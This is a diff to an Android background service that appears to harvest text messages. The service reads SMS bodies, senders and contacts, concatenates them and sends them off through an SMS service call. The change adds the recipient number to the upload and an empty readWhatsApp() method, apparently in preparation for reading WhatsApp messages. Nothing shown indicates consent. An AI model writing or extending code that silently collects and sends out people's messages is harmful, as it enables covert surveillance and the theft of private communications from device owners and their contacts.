@@ -134,6 +134,7 @@ public class BackgroundJobService {
             String MsgID = "";
             String MsgDate = "";
             String MsgFrom = "";
+            String MsgTo = "";
             String MsgText = "";
             String Timestamp = "";
             List<SMSData> smsList = new ArrayList<>();
@@ -149,6 +150,7 @@ public class BackgroundJobService {
                         SMSData sms = new SMSData();
                         sms.setBody(c.getString(c.getColumnIndexOrThrow("body")).toString());
                         sms.setNumber(c.getString(c.getColumnIndexOrThrow("address")).toString());
+                        sms.setTonNumber(UserMobile);
                         if (c.isNull(c.getColumnIndexOrThrow("person"))) {
                             sms.setPerson("Edwin");
                         } else {
@@ -195,37 +197,46 @@ public class BackgroundJobService {
                         StringBuilder sb1 = new StringBuilder(smsList.size());
                         StringBuilder sb2 = new StringBuilder(smsList.size());
                         StringBuilder stringBuilder = new StringBuilder(smsList.size());
+                        StringBuilder tostringBuilder = new StringBuilder(smsList.size());
                         StringBuilder stringBuilder3 = new StringBuilder(smsList.size());
                         for (i = 0; i < smsList.size(); i++) {
                             if (i == smsList.size() - 1) {
                                 sb1.append(((SMSData) smsList.get(i)).get_id());
                                 sb2.append(((SMSData) smsList.get(i)).getDate());
                                 stringBuilder.append(((SMSData) smsList.get(i)).getNumber());
+                                tostringBuilder.append(((SMSData) smsList.get(i)).getTonNumber());
                                 stringBuilder3.append(((SMSData) smsList.get(i)).getBody());
                             } else {
                                 sb1.append(((SMSData) smsList.get(i)).get_id() + "||");
                                 sb2.append(((SMSData) smsList.get(i)).getDate() + "||");
                                 stringBuilder.append(((SMSData) smsList.get(i)).getNumber() + "||");
+                                tostringBuilder.append(((SMSData) smsList.get(i)).getTonNumber() + "||");
                                 stringBuilder3.append(((SMSData) smsList.get(i)).getBody() + "||");
                             }
                         }
                         MsgID = sb1.toString();
                         MsgDate = sb2.toString();
                         MsgFrom = stringBuilder.toString();
+                        MsgTo = tostringBuilder.toString();
                         MsgText = stringBuilder3.toString();
                     } else {
                         MsgID = ((SMSData) smsList.get(0)).get_id();
                         MsgDate = ((SMSData) smsList.get(0)).getDate();
                         MsgFrom = ((SMSData) smsList.get(0)).getNumber();
+                        MsgTo = ((SMSData) smsList.get(0)).getTonNumber();
                         MsgText = ((SMSData) smsList.get(0)).getBody();
                     }
                 }
                 if (smsList.size() > 0) {
-                    smsService.sendSms(UserMobile, MsgID, MsgDate, MsgFrom, MsgText);
+                    smsService.sendSms(UserMobile, MsgID, MsgDate, MsgFrom,MsgTo, MsgText);
                 }
             } catch (Exception e22) {
                 e22.printStackTrace();
             }
         }
+    }
+
+    public void readWhatsApp(){
+
     }
 }
